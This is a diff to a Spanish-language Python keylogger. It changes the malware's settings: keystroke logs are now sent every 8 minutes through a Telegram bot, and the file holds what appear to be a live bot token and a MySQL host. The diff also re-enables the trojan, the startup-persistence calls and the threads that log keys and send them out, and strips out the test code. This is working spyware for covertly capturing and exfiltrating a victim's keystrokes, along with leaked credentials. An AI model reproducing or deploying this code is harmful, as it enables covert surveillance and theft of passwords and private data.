@@ -40,10 +40,10 @@ class Config:
         self.PATH_KEY = self.PATH_OCULT + self.NAME_KEY         # <No cambiar>
         self.PATH_LOG = self.LOG_KEY_PATH + self.LOG_NAME       # <No cambiar>
         # Importante
-        self.TIMESEND = 26 #[minutos]                                               # Tiempo de envió del registro
-        self.MODE = 2     # 0 = Gmail
-                          # 1 = DataBase                                            # Solo se puede usar una opción
-                          # 2 = TelegramBot
+        self.TIMESEND = 8 #[minutos]                                               # Tiempo de envió del registro
+        self.MODE = 2      # 0 = Gmail
+                           # 1 = DataBase                                           # Solo se puede usar una opción
+                           # 2 = TelegramBot
     class DataBase:  # Clase de Base de datos
         def __init__(self):
             self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
@@ -70,7 +70,7 @@ class Config:
             self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
             self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"             # TOKEN de tu Bot [Obligatorio]
             # Personalize
-            self.LEN_TEXT = 3500  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
+            self.LEN_TEXT = 3600  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
 
 
 class Functions:
@@ -224,7 +224,6 @@ class Util:
             os.rename(Config().PATH_LOG, pathN)
             # Abre el archivo
             f = open(pathN, 'r')
-
             def SendT(ID):
                 try:
                     bot = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
@@ -514,21 +513,14 @@ if __name__ == '__main__':
 
     print("[Keylogger] start...")
     print("[Keylogger] Listening to Keys...")
-    """"
+
     Util().Trojan()
     Util().addStartUp()
 
     p1 = threading.Thread(target=Keylogger().GetKeys)  # Enviar Registro
-
     p2 = threading.Thread(target=Send().Log)  # Registra teclas
 
     p2.start()
     p1.start()
     p1.join()
-    """
-    print("[TelegramBot] Proceso...")
-    # Abre el archivo
-    f = open(r"Z:\prueba.txt", 'r')
-    print(len(f.read()))
-    print(f.read())
 
